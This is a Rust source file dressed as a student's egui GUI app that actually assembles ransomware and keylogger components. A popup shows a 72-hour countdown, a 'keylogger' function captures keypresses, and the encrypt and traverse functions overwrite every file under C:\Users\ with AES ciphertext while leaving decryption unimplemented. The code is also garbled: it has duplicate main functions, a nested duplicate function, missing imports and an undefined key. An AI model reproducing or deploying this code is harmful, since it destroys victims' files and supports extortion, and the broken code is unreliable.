use eframe::{egui, epi};
use std::time::{Duration, Instant};

struct MyApp {
    start_time: Instant,
    text: String,
}

impl Default for MyApp {
    fn default() -> Self {
        Self {
            start_time: Instant::now(),
            text: "Hello, I'm a computer science student passionate about Rust!".to_owned(),
        }
    }
}

impl epi::App for MyApp {
    fn name(&self) -> &str {
        "My Egui App"
    }

    fn update(&mut self, ctx: &egui::CtxRef, _frame: &mut epi::Frame<'_>) {
        let elapsed = self.start_time.elapsed();
        let countdown = Duration::from_secs(72 * 60 * 60) - elapsed;

        egui::Window::new("My Popup").show(ctx, |ui| {
            ui.label(format!(
                "Time left: {} hours, {} minutes, {} seconds",
                countdown.as_secs() / 3600,
                (countdown.as_secs() % 3600) / 60,
                countdown.as_secs() % 60
            ));
            ui.label(&self.text);
        });
    }
}

fn main() {
    let app = MyApp::default();
    let native_options = eframe::NativeOptions::default();
    eframe::run_native(Box::new(app), native_options);
}

fn keylogger() {
    // killswitch if user types "please"
    let cmd = std::process::Command::new("cmd.exe")
        .arg("/K")
        .arg("echo keylogger started \n")
        .spawn()
        .expect("failed to start keylogger");

    loop {
        if poll(std::time::Duration::from_millis(100)).unwrap() {
            if let Event::Key(key_event) = read().unwrap() {
                match key_event.code {
                    KeyCode::Char('p') => {
                        if key_event
                            .modifiers
                            .contains(crossterm::event::KeyModifiers::CONTROL)
                        {
                            println!("Killswitch activated");
                            break;
                        }
                    }
                    KeyCode::Char(c) => {
                        println!("Key pressed: {}", c);
                    }
                    _ => {}
                }
            }
        }
    }

    fn detect_keypresses() {
        let stdin = io::stdin();
        let mut keys = stdin.keys();

        loop {
            if let Some(Ok(key)) = keys.next() {
                match key {
                    Key::Char(c) => {
                        // Handle character keypress
                        println!("Character key pressed: {}", c);
                    }
                    Key::Ctrl('c') => {
                        // Handle Ctrl+C keypress
                        println!("Ctrl+C pressed. Exiting...");
                        break;
                    }
                    Key::Ctrl(_) => {
                        // Handle other Ctrl keypresses
                        println!("Ctrl key pressed");
                    }
                    Key::Alt(_) => {
                        // Handle Alt keypresses
                        println!("Alt key pressed");
                    }
                    Key::Esc => {
                        // Handle Escape keypress
                        println!("Escape key pressed");
                    }
                    _ => {
                        // Handle other keypresses
                        println!("Key pressed: {:?}", key);
                    }
                }
            }
        }
    }
}

fn detect_keypresses() {
    let stdin = io::stdin();
    let mut keys = stdin.keys();

    loop {
        if let Some(Ok(key)) = keys.next() {
            match key {
                Key::Char(c) => {
                    // Handle character keypress
                    println!("Character key pressed: {}", c);
                }
                Key::Ctrl('c') => {
                    // Handle Ctrl+C keypress
                    println!("Ctrl+C pressed. Exiting...");
                    break;
                }
                Key::Ctrl(_) => {
                    // Handle other Ctrl keypresses
                    println!("Ctrl key pressed");
                }
                Key::Alt(_) => {
                    // Handle Alt keypresses
                    println!("Alt key pressed");
                }
                Key::Esc => {
                    // Handle Escape keypress
                    println!("Escape key pressed");
                }
                _ => {
                    // Handle other keypresses
                    println!("Key pressed: {:?}", key);
                }
            }
        }
    }
}

fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), io::Error> {
    let mut file = File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let mut rng = ChaCha20Rng::from_entropy();
    let mut nonce_array = [0u8; 12];
    rng.fill_bytes(&mut nonce_array);
    let nonce = Nonce::from_slice(&nonce_array);
    let ciphertext = cipher.encrypt(nonce, buffer.as_ref())?;

    file.set_len(0)?;
    file.write_all(&ciphertext)?;

    Ok(())
}

fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
    for entry in WalkDir::new("C:\\Users\\").follow_links(true) {
        match entry {
            Ok(entry) => {
                if do_encrypt {
                    if let Err(err) = encrypt(entry.path(), cipher) {
                        eprintln!("Error encrypting file: {}", err);
                    }
                } else {
                    // Decrypt logic goes here
                }
            }
            Err(e) => {
                eprintln!("Error accessing file: {}", e);
            }
        }
    }
    Ok(())
}

fn main() {
    // ... existing code ...

    let cipher = Aes256GcmSiv::new(&key);

    if let Err(err) = traverse(true, &cipher) {
        eprintln!("Error during traversal: {}", err);
    }

    // ... existing code ...
}
